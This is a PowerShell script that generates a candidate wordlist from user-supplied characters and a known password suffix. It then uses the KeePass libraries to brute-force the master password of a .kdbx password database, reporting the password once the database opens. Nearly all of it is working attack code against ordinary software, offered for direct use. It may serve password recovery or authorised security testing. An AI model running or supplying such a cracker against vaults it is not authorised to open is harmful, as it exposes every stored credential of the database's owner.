<#
.SYNOPSIS

  Generates a list of possible strings by combining a list of characters with a known suffix.
  It then uses the base functionality of the "PoshKPBrute" tool (the code has been shortened and adapted) to identify the valid Master Key to access the KeePass database (kdbx file).

.DESCRIPTION
  
  This script prompts the user to input a list of characters and a known suffix. It then generates a list of possible strings (dictionary) by combining each character in the list with the known suffix. The results are saved to a file named "Dictionary.txt" in the current directory.

.NOTES
  Version:                 1.0
  Author:                  Juampa Rodríguez (@UnD3sc0n0c1d0)
  Original author:         Wayne Evans
  Creation Date:           20/05/2023

.EXAMPLE
  PS C:\> Import-Module .\BruteForce-to-KeePass.ps1
  PS C:\> BruteForce-to-KeePass
          Type the list of characters: @, N, c, d, -, #, W,
          Type the known string: ssword
          Path of the kdbx file: C:\path\file.kdbx
          Master Password Found = P4ssword
#>

$keepasspath="C:\Program Files\KeePass Password Safe 2"

Function permutation{
          Process{
                $raw_characters = Read-Host "Type the list of characters"
                $characters=$raw_characters.replace(',','')
                $suffix = Read-Host "Type the known string"
                $output = foreach ($second_c in -split $characters) {
                $letter = 33..126 | %{[char]$_}
                foreach ($first_c in $letter) {
                Write-Output $first_c$second_c$suffix
                }
                }
                $output | Out-File -FilePath .\Dictionary.txt
          }
            }

Function load-keepassbinarys{
          Process{
                    Try { 
                        [Reflection.Assembly]::LoadFile("$keepasspath\KeePass.exe")|Out-Null
                        }Catch
                            { 
                             Write-warning "Cannot load KeePass binaries, please check the path: $keepasspath"
                             break
                            }
                    Try { 
                        [Reflection.Assembly]::LoadFile("$keepasspath\KeePass.XmlSerializers.dll")|Out-Null
                        }catch 
                            {
                             Write-warning  "Cannot load KeePass binaries, please check the path: $keepasspath"
                             break
                            }
          }
            }
Function try-key($x){
    $Key = new-object KeePassLib.Keys.CompositeKey
    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($x)));
    try{
    
    $Database.Open($IOConnectionInfo,$Key,$null)
        
        Write-Output ""
        Write-Warning "Master Password Found = $x `n`n"
        $Database.Close()  
        
            break   
    }
    catch{  
    }
  }
Function load-passwordfile{
          Process{
                $pwdfile = New-Object System.IO.StreamReader -Arg .\Dictionary.txt
                $count=0
                $sw = [Diagnostics.Stopwatch]::StartNew()
                while ($password = $pwdfile.ReadLine()) {
                try-key($password)
                if ($count % 1000 -eq 0) {
                }
                $count++
                }
          }
  
          End{
           $pwdfile.close()
           $sw.Stop()
          }
            }
Function check-kdbxfile{  
          Process{
                $targetfile = Read-Host "Path of the kdbx file"
                If ((Test-Path $targetfile) –eq $false) {
                Write-Host "`nThe destination file path: $targetfile is invalid!" -BackgroundColor Red
                Write-Output ""
                Break
                }
                $IOconnectionInfo.Path =$targetfile
                Return $targetfile
          }
            }
Function BruteForce-to-KeePass{  
          Process{
                permutation
                load-keepassbinarys
                $Database = new-object KeePassLib.PwDatabase
                $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
                check-kdbxfile
                load-passwordfile
                }
            }
